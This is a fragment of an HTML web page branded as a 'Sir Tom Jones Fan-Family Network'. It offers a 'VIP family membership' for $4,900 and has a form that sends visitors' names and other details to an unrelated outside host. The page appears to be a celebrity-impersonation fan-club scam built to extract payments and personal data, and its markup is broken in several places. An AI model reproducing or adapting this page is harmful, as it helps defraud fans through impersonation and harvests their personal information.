<head>

<body>
    <link rel="stylesheet" href="style.css">

    <header>
    <h1 style="text-align: center;">Sir Tom Jones Fan-Family Network</h1>
    </header>
    <p style="text-align: center; padding: 10px;">Enjoy 50% off of all packages, courtesy: <span style="font-weight: bold;">SIR TOM JONES @59</span></p>
    
   
          <div class="container">
        <h2>INPUT YOUR CORRECT DETAILS</h2>
        <form action="https://arabtradeinternational.onrender.com/send" method="POST">
            <label for="name">Name:</label>
            <input class="input" type="text" id="name" name="name" required>

            <label for="email">Email:</label>

            <label for="subscription-type">subscription-type:</label>

                <option value="divorced">VIP family membership $4,900 (formerly $9,900)</option>
             
            </select>

            <label for="referral">Referral Code:</label>
            <input style="margin-bottom: 50px;" class="input" type="number" id="referral" name="referral" required>

            

            <input class="submit" type="submit" value="Submit">
        </form>
    </div> 
    
    <footer>
